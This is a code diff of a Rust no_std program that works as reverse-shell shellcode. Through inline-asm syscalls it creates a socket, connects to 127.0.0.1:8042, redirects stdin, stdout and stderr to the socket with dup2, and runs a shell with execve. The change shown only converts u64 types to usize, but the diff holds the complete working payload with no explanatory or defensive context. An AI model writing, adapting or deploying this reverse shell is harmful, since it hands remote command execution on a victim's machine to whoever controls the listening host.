@@ -10,18 +10,18 @@ fn panic(_: &core::panic::PanicInfo) -> ! {
 const PORT: u16 = 0x6A1F; // 8042
 const IP: u32 = 0x0100007f; // 127.0.0.1
 
-const SYS_DUP2: u64 = 33;
-const SYS_SOCKET: u64 = 41;
-const SYS_CONNECT: u64 = 42;
-const SYS_EXECVE: u64 = 59;
+const SYS_DUP2: usize = 33;
+const SYS_SOCKET: usize = 41;
+const SYS_CONNECT: usize = 42;
+const SYS_EXECVE: usize = 59;
 
-const AF_INET: u64 = 2;
-const SOCK_STREAM: u64 = 1;
-const IPPROTO_IP: u64 = 0;
+const AF_INET: usize = 2;
+const SOCK_STREAM: usize = 1;
+const IPPROTO_IP: usize = 0;
 
-const STDIN: u64 = 0;
-const STDOUT: u64 = 1;
-const STDERR: u64 = 2;
+const STDIN: usize = 0;
+const STDOUT: usize = 1;
+const STDERR: usize = 2;
 
 #[repr(C)]
 struct sockaddr_in {
@@ -36,8 +36,8 @@ struct in_addr {
     s_addr: u32,
 }
 
-unsafe fn syscall2(syscall: u64, arg1: u64, arg2: u64) -> u64 {
-    let ret: u64;
+unsafe fn syscall2(syscall: usize, arg1: usize, arg2: usize) -> usize {
+    let ret: usize;
     asm!(
         "syscall",
         in("rax") syscall,
@@ -51,8 +51,8 @@ unsafe fn syscall2(syscall: u64, arg1: u64, arg2: u64) -> u64 {
     ret
 }
 
-unsafe fn syscall3(syscall: u64, arg1: u64, arg2: u64, arg3: u64) -> u64 {
-    let ret: u64;
+unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
+    let ret: usize;
     asm!(
         "syscall",
         in("rax") syscall,
@@ -84,8 +84,8 @@ fn _start() -> ! {
         syscall3(
             SYS_CONNECT,
             socket_fd,
-            &socket_addr as *const sockaddr_in as u64,
-            socket_addr_len as u64,
+            &socket_addr as *const sockaddr_in as usize,
+            socket_addr_len as usize,
         );
 
         syscall2(SYS_DUP2, socket_fd, STDIN);
@@ -96,7 +96,7 @@ fn _start() -> ! {
         //     syscall2(SYS_DUP2, socket_fd, i);
         // }
 
-        syscall3(SYS_EXECVE, shell.as_ptr() as u64, argv.as_ptr() as u64, 0);
+        syscall3(SYS_EXECVE, shell.as_ptr() as usize, argv.as_ptr() as usize, 0);
     };
 
     loop {}
